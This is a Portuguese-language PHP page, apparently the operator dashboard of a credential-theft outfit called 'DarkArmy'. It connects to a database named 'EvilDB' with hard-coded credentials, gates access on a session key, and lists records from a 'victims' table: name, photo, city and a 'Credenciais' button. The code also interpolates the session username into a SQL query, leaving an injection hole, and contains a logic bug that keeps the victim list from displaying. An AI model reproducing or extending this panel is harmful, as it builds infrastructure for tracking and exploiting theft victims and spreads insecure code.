<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="../css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="../css/theme.css">

	<script type="text/javascript" src="../js/bootstrap.min.js"></script>
	<script type="text/javascript" src="../js/sweetalert.min.js"></script>
	<script type="text/javascript" src="../js/jquery-3.4.1.min.js"></script>
	<title>DarkArmy</title>
	<style type="text/css">
		.card{
			width: 310px;
			margin-top:20px;
			padding-top:10px;
			position:relative;
			box-shadow: 0 0 15px black;
		}
		a[href="#top"]{
		    padding:10px;
		    position:fixed;
		    top: 90%;
		    right:40px;
		    display:none;
		    font-size: 30px;
		}
		a[href="#top"]:hover{
		    text-decoration:none;
		}
	</style>
</head>
<body style="overflow-x: hidden;">
	<!-- começo da barra de navegaçao -->
	<nav class="navbar fixed-top navbar-dark bg-dark" style="box-shadow: 0 0 15px black">
		<a class="navbar-brand" href="#">
    		<img src="../img/key.png" width="30" height="30" class="d-inline-block align-top">
    		If_Dark
    	</a>
		<form class="form-inline">
    		<input class="form-control mr-sm-2" type="search" placeholder="Pesquisar" aria-label="Pesquisar">
    		<button class="btn btn-danger my-2 my-sm-0" type="submit">Pesquisar</button>
  		</form>
	</nav>
	<!-- fim da barra -->
	<div id="top"></div>
	<br><br><br>
	
	<?php echo "<div class='card-deck' style='width:101%;position:relative;left:10px'>"; ?>
	<?php
	session_start();
	$con = new PDO(
	"mysql:host=localhost;dbname=EvilDB",
	"Tennebris",
	"password"
	);
	$user = $_SESSION['usuario'];

	$select = $con->query("SELECT keysec FROM users WHERE name = '$user'");
	$result = $select->fetch(PDO::FETCH_ASSOC);
	$key = $result['keysec'];

	if (!isset($_SESSION['keysec'])){
			$_SESSION['msg'] = "Acesso Restrito";
			$_SESSION['type'] = "error";
			header("Location: ../login");
			exit;
	}else{
		if ($_SESSION["keysec"] != $key){
			$_SESSION['msg'] = "Acesso Restrito";
			$_SESSION['type'] = "error";
			header("Location: ../login");
			exit;
		}
	}

	$query = $con->query("SELECT * FROM victims LIMIT 20");
	$data = $query->fetchall(PDO::FETCH_ASSOC);
	if (isset($dados)){
		foreach ($data as $dados){
			$name = $dados['nome'];
			$secund = $dados['sobre'];
			$img = $dados['image'];
			$city = $dados['cidade'];
			echo "
			<div class='row'>
			<div class='col-sm-8'>
			<div class='card'>
			  <img src='$img' class='card-img-top'>
			  <div class='card-body'>
			    <h5 class='card-title'>Nome: $name $secund</h5>
			    <p class='card-text'>Cidade: $city</p>
			    <a href='#' class='btn btn-primary'>Credenciais</a>
			  </div>
			</div>
			</div>
			</div>";
		}
	}else{
		echo "<center><h1 style='position:relative;left:95%;font-family:hack'>Sem Credenciais no momento</h1></center>";
	}
	?>
	<?php echo "</div><br>"; ?>
	<nav aria-label="Page navigation example">
	  <ul class="pagination">
	    <li class="page-item">
	      <a class="page-link" href="#" aria-label="Previous">
	        <span aria-hidden="true">&laquo;</span>
	        <span class="sr-only">Previous</span>
	      </a>
	    </li>
	    <li class="page-item"><a class="page-link" href="#">1</a></li>
	    <li class="page-item"><a class="page-link" href="#">2</a></li>
	    <li class="page-item"><a class="page-link" href="#">3</a></li>
	    <li class="page-item">
	      <a class="page-link" href="#" aria-label="Next">
	        <span aria-hidden="true">&raquo;</span>
	        <span class="sr-only">Next</span>
	      </a>
	    </li>
	  </ul>
	</nav>
	<footer class="page-footer font-small fixed-bottom" style="background-color: rgba(0,0,20);color: white">
		<div class="footer-copyright text-center py-3">© 2019 Copyright:
			<a href="#">DarkArmy</a>
		</div>
	</footer>
</body>
</html>